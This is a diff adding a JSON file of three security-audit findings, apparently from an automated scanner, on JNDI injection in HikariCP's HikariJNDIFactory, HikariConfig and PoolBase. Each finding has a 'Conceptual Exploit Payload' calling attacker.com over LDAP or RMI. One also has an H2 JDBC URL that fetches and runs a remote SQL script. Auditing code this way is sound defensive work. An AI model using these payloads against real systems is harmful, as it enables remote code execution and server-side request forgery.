@@ -1,0 +1,47 @@
+[
+  {
+    "finding_id": "40da6555-2d50-5f0d-a4fc-48b04b7fab55",
+    "session_id": "ChA4OGRlNGM0MDNiODU0ZTA2EAgaATAqBG1haW4",
+    "title": "JNDI Injection and Arbitrary Pool Instantiation in HikariJNDIFactory",
+    "file_path": "/home/jfplante_google_com/repos/h08-hikaricp_rep1/src/main/java/com/zaxxer/hikari/HikariJNDIFactory.java",
+    "severity": "CRITICAL",
+    "confidence": 100,
+    "analysis": "In `com.zaxxer.hikari.HikariJNDIFactory.java`, the `getObjectInstance` method implements `javax.naming.spi.ObjectFactory`. When a JNDI client resolves a `javax.naming.Reference` specifying `HikariJNDIFactory` as its factory, `getObjectInstance` processes the reference and converts all its `RefAddr` elements into configuration properties.\n\n1. **JNDI Injection via `dataSourceJNDI`**:\n   - **Source**: Untrusted `Reference` object passed to `HikariJNDIFactory.getObjectInstance` (specifically a `RefAddr` with type `dataSourceJNDI`).\n   - **Data Flow**: `getObjectInstance` calls `createDataSource(properties, nameCtx)`. In `createDataSource`, if `properties.getProperty(\"dataSourceJNDI\")` is present, it invokes `lookupJndiDataSource(properties, context, jndiName)`.\n   - **Sink**: Lines 72 and 75 execute `(DataSource) context.lookup(jndiName)` and `(DataSource) ic.lookup(jndiName)`.\n   - **Sanitization**: There is no validation, allowlist check, or protocol restriction on `jndiName`. Passing an LDAP or RMI URL (e.g., `ldap://attacker.com:1389/Exploit`) causes an outbound JNDI lookup, leading to Remote Code Execution or SSRF.\n\n2. **RCE via Local ObjectFactory Gadget**:\n   - When modern JDKs disable remote codebase loading (`trustURLCodebase=false`), attackers exploit JNDI injection vulnerabilities by pointing references to local `ObjectFactory` implementations available on the application classpath.\n   - Because `HikariJNDIFactory` extracts all `HikariConfig` properties from the `Reference` and initializes `new HikariDataSource(new HikariConfig(properties))`, an attacker controlling the reference can supply arbitrary pool configuration including `driverClassName`, `jdbcUrl`, and `connectionInitSql`.\n   - When the `HikariDataSource` is instantiated, the pool immediately attempts to create an initial connection, executing SQL against or initializing drivers pointing to attacker-controlled JDBC connection endpoints (e.g., H2 `RUNSCRIPT` / `INIT`, MySQL deserialization, or PostgreSQL socket factories), achieving Remote Code Execution.\n\n**Conceptual Exploit Payload**:\n```java\nReference ref = new Reference(\"javax.sql.DataSource\", \"com.zaxxer.hikari.HikariJNDIFactory\", null);\nref.add(new StringRefAddr(\"dataSourceJNDI\", \"ldap://attacker.com:1389/Exploit\"));\n// Alternatively, exploiting the JDBC connection sink:\n// ref.add(new StringRefAddr(\"driverClassName\", \"org.h2.Driver\"));\n// ref.add(new StringRefAddr(\"jdbcUrl\", \"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.com/exploit.sql'\"));\nnew HikariJNDIFactory().getObjectInstance(ref, null, null, null);\n```",
+    "snippet": "   private DataSource createDataSource(final Properties properties, final Context context) throws NamingException\n   {\n      var jndiName = properties.getProperty(\"dataSourceJNDI\");\n      if (jndiName != null) {\n         return lookupJndiDataSource(properties, context, jndiName);\n      }\n\n      return new HikariDataSource(new HikariConfig(properties));\n   }\n\n   private DataSource lookupJndiDataSource(final Properties properties, final Context context, final String jndiName) throws NamingException\n   {\n      if (context == null) {\n         throw new RuntimeException(\"JNDI context does not found for dataSourceJNDI : \" + jndiName);\n      }\n\n      var jndiDS = (DataSource) context.lookup(jndiName);\n      if (jndiDS == null) {\n         final var ic = new InitialContext();\n         jndiDS = (DataSource) ic.lookup(jndiName);\n         ic.close();\n      }\n\n      if (jndiDS != null) {\n         var config = new HikariConfig(properties);\n         config.setDataSource(jndiDS);\n         return new HikariDataSource(config);\n      }\n\n      return null;\n   }",
+    "vuln_type": "JNDI Injection",
+    "vuln_id": "CWE-74",
+    "status": "OPEN",
+    "start_line": 56,
+    "end_line": 86
+  },
+  {
+    "finding_id": "5b0104be-22ed-5ab2-b24d-dfc358ea7aaa",
+    "session_id": "ChA4OGRlNGM0MDNiODU0ZTA2EAgaATAqBG1haW4",
+    "title": "JNDI Injection via Unsanitized Metric and HealthCheck Registry Lookups in HikariConfig",
+    "file_path": "/home/jfplante_google_com/repos/h08-hikaricp_rep1/src/main/java/com/zaxxer/hikari/HikariConfig.java",
+    "severity": "HIGH",
+    "confidence": 95,
+    "analysis": "In `com.zaxxer.hikari.HikariConfig.java`, the setters `setMetricRegistry(Object metricRegistry)` (line 664) and `setHealthCheckRegistry(Object healthCheckRegistry)` (line 699) accept arbitrary `Object` parameters. If the supplied argument is a `String`, both methods pass the string directly to the private helper method `getObjectOrPerformJndiLookup(Object object)` on lines 671 and 704.\n\n- **Source**: External configuration properties supplied to `HikariConfig` via property files, environment/system properties, or reflection via `PropertyElf` (e.g., `metricRegistry` or `healthCheckRegistry` key-value pairs).\n- **Data Flow**: When `setMetricRegistry` or `setHealthCheckRegistry` is passed a String, line 671 / 704 invokes `getObjectOrPerformJndiLookup(object)`.\n- **Sanitization/Validation**: There is no URL scheme validation, host allowlisting, or sanitization on the input string. Although type checks (checking if the resulting object is assignable to `MetricRegistry` or `HealthCheckRegistry`) occur on lines 673-676 and lines 706-708, these checks happen *after* the JNDI lookup has already executed.\n- **Sink**: Line 1195 executes `initCtx.lookup((String) object)`. If an attacker can supply the configuration string (e.g. `ldap://attacker.com:1389/Exploit` or `rmi://attacker.com:1099/Exploit`), `InitialContext.lookup` initiates an outbound connection to the attacker's server, enabling remote JNDI injection, arbitrary object deserialization, or SSRF.\n\n**Conceptual Exploit Payload**:\n```properties\n# HikariCP configuration file / property setting:\nmetricRegistry=ldap://attacker.com:1389/Exploit\n# or:\n# healthCheckRegistry=ldap://attacker.com:1389/Exploit\n```\nWhen parsed by `new HikariConfig(properties)` or `config.setMetricRegistry(\"ldap://attacker.com:1389/Exploit\")`, `getObjectOrPerformJndiLookup` calls `new InitialContext().lookup(\"ldap://attacker.com:1389/Exploit\")`.",
+    "snippet": "   private Object getObjectOrPerformJndiLookup(Object object)\n   {\n      if (object instanceof String) {\n         try {\n            var initCtx = new InitialContext();\n            return initCtx.lookup((String) object);\n         }\n         catch (NamingException e) {\n            throw new IllegalArgumentException(e);\n         }\n      }\n      return object;\n   }",
+    "vuln_type": "JNDI Injection",
+    "vuln_id": "CWE-74",
+    "status": "OPEN",
+    "start_line": 1190,
+    "end_line": 1202
+  },
+  {
+    "finding_id": "dbaf3e6d-809b-50d6-aeb6-de390e175056",
+    "session_id": "ChA4OGRlNGM0MDNiODU0ZTA2EAgaATAqBG1haW4",
+    "title": "JNDI Injection via dataSourceJNDI in PoolBase",
+    "file_path": "/home/jfplante_google_com/repos/h08-hikaricp_rep1/src/main/java/com/zaxxer/hikari/pool/PoolBase.java",
+    "severity": "HIGH",
+    "confidence": 95,
+    "analysis": "In `com.zaxxer.hikari.pool.PoolBase.java`, the `initializeDataSource` method initializes the underlying data source for the connection pool based on the configuration provided in `HikariConfig`.\n\n- **Source**: Untrusted configuration property `dataSourceJNDI` supplied to `HikariConfig` via properties files, environment configurations, or `HikariConfig.setDataSourceJNDI(String)`.\n- **Data Flow**: When `HikariPool` starts up (`super(config)` in `PoolBase`), `initializeDataSource()` is called. On line 329, if `dataSourceJNDI != null` and `ds == null`, it reaches line 331-332.\n- **Sanitization/Validation**: There is zero validation, sanitization, or protocol filtering on `dataSourceJNDI`.\n- **Sink**: Line 332 executes `(DataSource) ic.lookup(dataSourceJNDI)`. Supplying an untrusted JNDI URL (such as `ldap://attacker.com:1389/Exploit` or `rmi://attacker.com:1099/Exploit`) causes `InitialContext` to connect to the external endpoint, leading to JNDI Injection / Remote Code Execution / SSRF.\n\n**Conceptual Exploit Payload**:\n```properties\n# HikariCP configuration property:\ndataSourceJNDI=ldap://attacker.com:1389/Exploit\n```\nWhen `new HikariDataSource(new HikariConfig(props))` initializes the pool, `PoolBase.initializeDataSource` executes `ic.lookup(\"ldap://attacker.com:1389/Exploit\")`.",
+    "snippet": "      else if (dataSourceJNDI != null \u0026\u0026 ds == null) {\n         try {\n            var ic = new InitialContext();\n            ds = (DataSource) ic.lookup(dataSourceJNDI);\n         } catch (NamingException e) {\n            throw new PoolInitializationException(e);\n         }\n      }",
+    "vuln_type": "JNDI Injection",
+    "vuln_id": "CWE-74",
+    "status": "OPEN",
+    "start_line": 329,
+    "end_line": 336
+  }
+]
